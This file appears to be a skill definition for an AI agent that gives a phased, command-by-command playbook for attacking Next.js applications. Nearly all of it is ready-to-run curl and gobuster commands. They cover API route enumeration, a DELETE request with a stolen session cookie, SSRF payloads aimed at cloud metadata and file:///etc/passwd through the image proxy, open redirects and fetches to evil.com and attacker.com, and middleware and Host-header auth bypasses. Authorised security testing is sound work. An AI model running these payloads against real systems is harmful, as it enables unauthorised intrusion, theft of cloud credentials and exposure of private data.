---
name: framework-nextjs
description: "Next.js security testing — API route exposure, getServerSideProps SSRF, build output disclosure, middleware bypass, next.config.js misconfig, rewrites abuse, image proxy SSRF. Triggers: 'nextjs', 'next.js', 'nextjs security', 'react ssr', 'vercel app security', 'nextjs api routes', 'getserversideprops ssrf'."
---

# Next.js Security Testing

Next.js attack surface: API routes, SSR data leaks, middleware bypass, image proxy SSRF.

## Phase 1: Fingerprinting & Route Discovery

```bash
TARGET="https://TARGET"

# Detect Next.js
curl -sI "$TARGET" | grep -i "x-powered-by\|next.js"
curl -s "$TARGET/_next/static/chunks/pages/_app-*.js" | head -50

# Next.js build manifest (lists all page routes)
curl -s "$TARGET/_next/static/$(curl -s "$TARGET" | grep -oP '_buildManifest.*?\.js' | head -1)" \
  | python3 -m json.tool 2>/dev/null | tee /workspace/output/build-manifest.json

# Enumerate API routes
gobuster dir -u "$TARGET/api" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o /workspace/output/nextjs-api-routes.txt
```

## Phase 2: API Route Misconfiguration

```bash
# Next.js API routes at /api/* — test without auth
for path in /api/user /api/admin /api/users /api/config /api/env /api/debug /api/health; do
  code=$(curl -so /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$code $path"
done | tee /workspace/output/api-probe.txt

# Method confusion on API routes
curl -s -X DELETE "$TARGET/api/users/1" -H "Cookie: session=STOLEN"
curl -s -X PUT "$TARGET/api/config" -H "Content-Type: application/json" -d '{"debug":true}'

# Check for exposed env vars in HTML
curl -s "$TARGET" | grep -oP '"[A-Z_]{3,}"\s*:\s*"[^"]{5,}"' | grep -v "className\|children"
```

## Phase 3: getServerSideProps SSRF

```bash
# SSRF via URL params passed to getServerSideProps
curl -s "$TARGET/preview?url=http://169.254.169.254/latest/meta-data/"
curl -s "$TARGET/content?source=http://localhost:3000/api/admin"
curl -s "$TARGET/render?page=http://internal-service/"

# Open redirect via next.config.js redirects
curl -sI "$TARGET/redirect?to=https://evil.com" | grep "Location:"
curl -sI "$TARGET/r/https://evil.com" | grep "Location:"
```

## Phase 4: Next.js Image Proxy Abuse

```bash
# /api/image proxy — SSRF via url parameter
curl -s "$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=128&q=75"
curl -s "$TARGET/_next/image?url=file:///etc/passwd&w=128&q=75"
curl -s "$TARGET/_next/image?url=http://internal-api:8080/admin&w=128&q=75"

# Check allowed domains in next.config.js
curl -s "$TARGET/_next/image?url=http://attacker.com/evil.svg&w=128&q=75"
```

## Phase 5: Middleware Bypass

```bash
# Next.js middleware bypass via path manipulation
# Middleware at /admin checks auth — try:
curl -s "$TARGET/admin/../admin" -H "Cookie: "
curl -s "$TARGET/admin/" -H "x-middleware-subrequest: middleware"
curl -s "$TARGET/admin%2f" -H "Cookie: "

# Auth bypass via Host header
curl -s "$TARGET/admin" -H "Host: localhost" -H "X-Forwarded-Host: localhost"

# Trailing slash bypass
curl -s "$TARGET/api/admin/"
curl -s "$TARGET/api/admin.json"
```

## Output

Save to `/workspace/output/`:
- `build-manifest.json` — Next.js route map
- `api-probe.txt` — API route discovery
- `nextjs-api-routes.txt` — gobuster results

## Next Phase

→ `vuln-ssrf` for image proxy/getServerSideProps SSRF exploitation
→ `vuln-cors` for API route CORS testing
